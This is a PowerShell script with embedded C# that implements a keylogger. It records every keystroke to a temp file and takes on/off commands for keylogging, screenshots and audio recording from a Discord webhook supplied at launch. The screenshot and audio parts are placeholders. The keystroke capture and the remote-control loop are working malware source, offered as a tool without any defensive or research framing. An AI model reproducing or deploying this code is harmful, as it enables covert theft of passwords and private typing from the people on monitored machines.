# Ensure that the webhook URL is set directly from the command line
$webhookURL = $dc  # $dc is the variable passed via the command line

# Define the paths for the temp log file and config file
$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')
$configFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'config.dat')

# Initialize configuration variables with default values
$activityMonitor = $false
$screenshotCapture = $false
$audioRecording = $false

# Function to load configuration from the .dat file
function Load-Config {
    if (Test-Path $configFilePath) {
        $configContent = Get-Content $configFilePath
        foreach ($line in $configContent) {
            if ($line -match "^activityMonitor\s*=\s*(.*)$") {
                $global:activityMonitor = [bool]::Parse($matches[1])
            }
            elseif ($line -match "^screenshotCapture\s*=\s*(.*)$") {
                $global:screenshotCapture = [bool]::Parse($matches[1])
            }
            elseif ($line -match "^audioRecording\s*=\s*(.*)$") {
                $global:audioRecording = [bool]::Parse($matches[1])
            }
        }
        Write-Host "Configuration loaded from $configFilePath" -ForegroundColor Green
    } else {
        Write-Host "Config file not found. Using default configuration." -ForegroundColor Yellow
    }
}

# Function to save configuration to the .dat file
function Save-Config {
    $configContent = @()
    $configContent += "activityMonitor = $activityMonitor"
    $configContent += "screenshotCapture = $screenshotCapture"
    $configContent += "audioRecording = $audioRecording"
    
    $configContent | Out-File -FilePath $configFilePath -Force
    Write-Host "Configuration saved to $configFilePath" -ForegroundColor Green
}

# Function to read and process commands from Discord
function Check-Discord-Commands {
    try {
        $response = Invoke-RestMethod -Uri $webhookURL -Method Get
        $commands = $response.content.Split(" ")

        foreach ($command in $commands) {
            if ($command -match "^/activityMonitor=(.*)$") {
                $global:activityMonitor = [bool]::Parse($matches[1])
            }
            elseif ($command -match "^/screenshotCapture=(.*)$") {
                $global:screenshotCapture = [bool]::Parse($matches[1])
            }
            elseif ($command -match "^/audioRecording=(.*)$") {
                $global:audioRecording = [bool]::Parse($matches[1])
            }

            # Save the updated configuration after processing commands
            Save-Config
        }
    }
    catch {
        Write-Host "Error while checking Discord commands:" -ForegroundColor Red
        Write-Host $_.Exception.Message
    }
}

# Function to capture input using the keylogger
function Start-KeyLogger {
    # Only start keylogger if activityMonitor is enabled
    if ($activityMonitor) {
        # Check if the custom utility type is already loaded
        $customUtilityType = [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object { 
            $_.GetTypes() | Where-Object { $_.Name -eq 'KeyCaptureUtility' }
        }

        if (-not $customUtilityType) {
            # Add Type for custom utility class
            Add-Type @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public class KeyCaptureUtility
{
    // DLL Imports for keyboard input functions
    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);

    public static void CaptureInput(string filePath)
    {
        StringBuilder captureBuffer = new StringBuilder();
        var lastKeypressTime = System.Diagnostics.Stopwatch.StartNew();
        TimeSpan keypressThreshold = TimeSpan.FromSeconds(10);

        // Ensure the file exists, create it if it doesn't
        if (!File.Exists(filePath))
        {
            File.Create(filePath).Dispose();
            Console.WriteLine("File created: " + filePath);  // Log file creation
        }

        // Continuous loop to capture keypresses
        while (true)
        {
            bool keyPressed = false;

            // Check if the last key press time exceeds threshold
            while (lastKeypressTime.Elapsed < keypressThreshold)
            {
                Thread.Sleep(30);  // Sleep for 30 ms

                // Iterate through all possible virtual keycodes
                for (int asc = 8; asc <= 254; asc++)
                {
                    short keyst = GetAsyncKeyState(asc);

                    // Check if the key is pressed (key state = -32767 means pressed)
                    if (keyst == -32767)
                    {
                        keyPressed = true;
                        lastKeypressTime.Restart();  // Reset inactivity timer

                        // Translate the key to a readable character
                        int vtkey = MapVirtualKey((uint)asc, 3);
                        byte[] kbst = new byte[256];
                        GetKeyboardState(kbst);
                        StringBuilder logChar = new StringBuilder();

                        // Get the character for the key
                        if (ToUnicode((uint)asc, (uint)vtkey, kbst, logChar, logChar.Capacity, 0) != 0)
                        {
                            string charPressed = logChar.ToString();

                            // Handle special keys like Backspace, Enter, and Escape
                            if (asc == 8) charPressed = "[BKSP]";
                            if (asc == 13) charPressed = "[ENTER]";
                            if (asc == 27) charPressed = "[ESC]";

                            captureBuffer.Append(charPressed);
                        }
                    }
                }
            }

            if (keyPressed)
            {
                // Save input to the file with a timestamp
                string timestamp = DateTime.Now.ToString("dd-MM-yyyy HH:mm:ss");
                string message = timestamp + " : " + captureBuffer.ToString() + "\r\n";
                File.AppendAllText(filePath, message);
                Console.WriteLine("Input saved: " + message);  // Log the saved message
                captureBuffer.Clear();  // Clear the input buffer after saving
            }

            // Reset the stopwatch and continue checking
            lastKeypressTime.Restart();
        }
    }
}
"@

        }

        # Set the path for the captured input log file (using the Temp directory)
        Write-Host "File path for keylogger: $tempFilePath"  # Check file path

        # Call the CaptureInput method to start capturing inputs (synchronously)
        [KeyCaptureUtility]::CaptureInput($tempFilePath)
    }
    else {
        Write-Host "Keylogger is disabled in the configuration." -ForegroundColor Yellow
    }
}

# Function to handle screenshots (placeholder)
function Start-ScreenshotCapture {
    if ($screenshotCapture) {
        Write-Host "Screenshot capturing is enabled. Implement screenshot capture logic here." -ForegroundColor Cyan
    }
    else {
        Write-Host "Screenshot capture is disabled in the configuration." -ForegroundColor Yellow
    }
}

# Function to handle audio recording (placeholder)
function Start-AudioRecording {
    if ($audioRecording) {
        Write-Host "Audio recording is enabled. Implement audio capture logic here." -ForegroundColor Cyan
    }
    else {
        Write-Host "Audio recording is disabled in the configuration." -ForegroundColor Yellow
    }
}

# Create temp log and config files if they don't exist
if (-not (Test-Path $tempFilePath)) {
    New-Item -Path $tempFilePath -ItemType File -Force
    Write-Host "Created temp_log.txt" -ForegroundColor Green
}

if (-not (Test-Path $configFilePath)) {
    Save-Config  # Create the config file with default values
    Write-Host "Created config.dat" -ForegroundColor Green
}

# Load the configuration from the .dat file at the start
Load-Config

# Infinite loop to check log file, Discord commands, and send logs every 10 seconds
while ($true) {
    # Pause for 10 seconds before checking
    Start-Sleep -Seconds 10

    # Check for new commands from Discord
    Check-Discord-Commands

    # Start the keylogger, screenshot capture, or audio recording based on config
    Start-KeyLogger
    Start-ScreenshotCapture
    Start-AudioRecording
}
